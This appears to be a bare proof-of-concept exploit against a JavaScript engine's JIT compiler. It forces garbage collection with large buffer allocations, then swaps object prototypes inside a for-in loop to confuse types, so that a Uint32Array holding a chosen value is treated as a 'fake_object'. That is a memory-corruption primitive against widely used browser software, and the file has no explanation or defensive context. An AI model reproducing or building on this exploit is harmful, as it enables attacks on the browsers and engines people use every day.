function gc() {
    for (let i2 = 0; i2 < 10; i2++) {
        const v14 = new ArrayBuffer((1024 * 1024) * 10);
        let ab = v14;
    }
}
function opt(a17) {
    for (let i19 = 0; i19 < 500; i19++) {
    }
    let tmp = { a: 1 };
    gc();
    tmp.__proto__ = {};
    for (const v30 in tmp) {
        tmp.__proto__ = {};
        gc();
        a17.__proto__ = {};
        return a17[v30];
    }
}
opt({});
const v39 = new Uint32Array(100);
let fake_object_memory = v39;
fake_object_memory[0] = 4660;
let fake_object = opt(fake_object_memory);
print(fake_object);
